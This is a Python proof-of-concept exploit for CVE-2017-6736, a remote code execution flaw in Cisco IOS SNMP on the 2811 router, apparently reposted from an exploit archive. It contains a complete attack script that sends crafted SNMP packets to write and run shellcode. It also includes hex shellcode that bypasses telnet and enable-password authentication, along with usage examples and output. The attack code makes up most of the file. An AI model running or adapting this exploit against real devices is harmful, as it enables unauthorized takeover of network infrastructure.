#!/usr/bin/env python
  
if False: '''
CVE-2017-6736 / cisco-sa-20170629-snmp Cisco IOS remote code execution
===================
  
  
This repository contains Proof-Of-Concept code for exploiting remote code execution vulnerability in SNMP service disclosed by Cisco Systems on June 29th 2017 - <https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170629-snmp> 
  
  
Description
-------------
  
RCE exploit code is available for Cisco Integrated Service Router 2811. This exploit is firmware dependent. The latest firmware version is supported:
  
- Cisco IOS Software, 2800 Software (C2800NM-ADVENTERPRISEK9-M), Version 15.1(4)M12a, RELEASE SOFTWARE (fc1)
  
ROM Monitor version:
  
- System Bootstrap, Version 12.4(13r)T, RELEASE SOFTWARE (fc1)
  
  
Read-only community string is required to trigger the vulnerability. 
  
  
  
Shellcode
------------
  
The exploit requires shellcode as HEX input. This repo contains an example shellcode for bypassing authentication in telnet service and in enable prompt. Shellcode to revert changes is also available. If you want to write your own shellcode feel free to do so. Just have two things in mind:
  
- Don't upset the watchdog by running your code for too long. Call a sleep function once in a while.
- Return execution flow back to SNMP service at the end. You can use last opcodes from the demo shellcode:
  
```
3c1fbfc4    lui $ra, 0xbfc4
37ff89a8    ori $ra, $ra, 0x89a8
03e00008    jr  $ra
00000000    nop
```  
  
  
Usage example
-------------
  
```
$ sudo python c2800nm-adventerprisek9-mz.151-4.M12a.py 192.168.88.1 public 8fb40250000000003c163e2936d655b026d620000000000002d4a821000000008eb60000000000003c1480003694f000ae96000000000000aea00000000000003c1fbfc437ff89a803e0000800000000
Writing shellcode to 0x8000f000
.
Sent 1 packets.
0x8000f0a4: 8fb40250    lw  $s4, 0x250($sp)
.
Sent 1 packets.
0x8000f0a8: 00000000    nop 
.
Sent 1 packets.
0x8000f0ac: 3c163e29    lui $s6, 0x3e29
.
Sent 1 packets.
0x8000f0b0: 36d655b0    ori $s6, $s6, 0x55b0
```
  
Notes
-----------
  
Firmware verson can be read via snmpget command:
  
```
$ snmpget -v 2c -c public 192.168.88.1 1.3.6.1.2.1.1.1.0
  
SNMPv2-MIB::sysDescr.0 = STRING: Cisco IOS Software, 2800 Software (C2800NM-ADVENTERPRISEK9-M), Version 15.1(4)M12a, RELEASE SOFTWARE (fc1)
Technical Support: http://www.cisco.com/techsupport
Copyright (c) 1986-2016 by Cisco Systems, Inc.
Compiled Tue 04-Oct-16 03:37 by prod_rel_team
```
  
Author
------
  
Artem Kondratenko https://twitter.com/artkond
  
  
  
  
  
## Shellcode
8fb40250000000003c163e2936d655b026d620000000000002d4a821000000008eb60000000000003c1480003694f000ae96000000000000aea00000000000003c1fbfc437ff89a803e0000800000000
  
## unset_shellcode
8fb40250000000003c163e2936d655b026d620000000000002d4a821000000003c1480003694f0008e96000000000000aeb60000000000003c1fbfc437ff89a803e0000800000000
'''
  
from scapy.all import *
from time import sleep
from struct import pack, unpack
import random
import argparse
import sys
from termcolor import colored
  
  
try:
    cs = __import__('capstone')
except ImportError:
    pass
  
def bin2oid(buf):
    return ''.join(['.' + str(unpack('B',x)[0]) for x in buf])
  
def shift(s, offset):
    res = pack('>I', unpack('>I', s)[0] + offset)
    return res
  
  
  
alps_oid = '1.3.6.1.4.1.9.9.95.1.3.1.1.7.108.39.84.85.195.249.106.59.210.37.23.42.103.182.75.232.81{0}{1}{2}{3}{4}{5}{6}{7}.14.167.142.47.118.77.96.179.109.211.170.27.243.88.157.50{8}{9}.35.27.203.165.44.25.83.68.39.22.219.77.32.38.6.115{10}{11}.11.187.147.166.116.171.114.126.109.248.144.111.30'
shellcode_start = '\x80\x00\xf0\x00'
  
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("host", type=str, help="host IP")
    parser.add_argument("community", type=str, help="community string")
    parser.add_argument("shellcode", action='store', type=str, help='shellcode to run (in hex)')
    args = parser.parse_args()
  
  
    sh_buf = args.shellcode.replace(' ','').decode('hex')
    print 'Writing shellcode to 0x{}'.format(shellcode_start.encode('hex'))
    if 'capstone' in sys.modules: 
        md = cs.Cs(cs.CS_ARCH_MIPS, cs.CS_MODE_MIPS32 | cs.CS_MODE_BIG_ENDIAN)
  
    for k, sh_dword in enumerate([sh_buf[i:i+4] for i in range(0, len(sh_buf), 4)]):
        s0 = bin2oid(sh_dword)  # shellcode dword
        s1 = bin2oid('\x00\x00\x00\x00') 
        s2 = bin2oid('\xBF\xC5\xB7\xDC')
        s3 = bin2oid('\x00\x00\x00\x00')
        s4 = bin2oid('\x00\x00\x00\x00')
        s5 = bin2oid('\x00\x00\x00\x00')
        s6 = bin2oid('\x00\x00\x00\x00')
        ra = bin2oid('\xbf\xc2\x2f\x60') # return control flow jumping over 1 stack frame
        s0_2 = bin2oid(shift(shellcode_start, k * 4))
        ra_2 = bin2oid('\xbf\xc7\x08\x60')
        s0_3 = bin2oid('\x00\x00\x00\x00')
        ra_3 = bin2oid('\xBF\xC3\x86\xA0')
          
        payload = alps_oid.format(s0, s1, s2, s3, s4, s5, s6, ra, s0_2, ra_2, s0_3, ra_3)
          
        send(IP(dst=args.host)/UDP(sport=161,dport=161)/SNMP(community=args.community,PDU=SNMPget(varbindlist=[SNMPvarbind(oid=payload)])))
  
        cur_addr = unpack(">I",shift(shellcode_start, k * 4 + 0xa4))[0]
        if 'capstone' in sys.modules: 
            for i in md.disasm(sh_dword, cur_addr):
                color = 'green'
                print("0x%x:\t%s\t%s\t%s" %(i.address, sh_dword.encode('hex'), colored(i.mnemonic, color), colored(i.op_str, color)))
        else:
            print("0x%x:\t%s" %(cur_addr, sh_dword.encode('hex')))
              
        sleep(1)
  
    ans = raw_input("Jump to shellcode? [yes]: ")
  
    if ans == 'yes':
        ra = bin2oid(shift(shellcode_start, 0xa4)) # return control flow jumping over 1 stack frame
        zero = bin2oid('\x00\x00\x00\x00')
        payload = alps_oid.format(zero, zero, zero, zero, zero, zero, zero, ra, zero, zero, zero, zero)
        send(IP(dst=args.host)/UDP(sport=161,dport=161)/SNMP(community=args.community,PDU=SNMPget(varbindlist=[SNMPvarbind(oid=payload)])))
        print 'Jump taken!'
 
#  0day.today [2020-08-11]  #
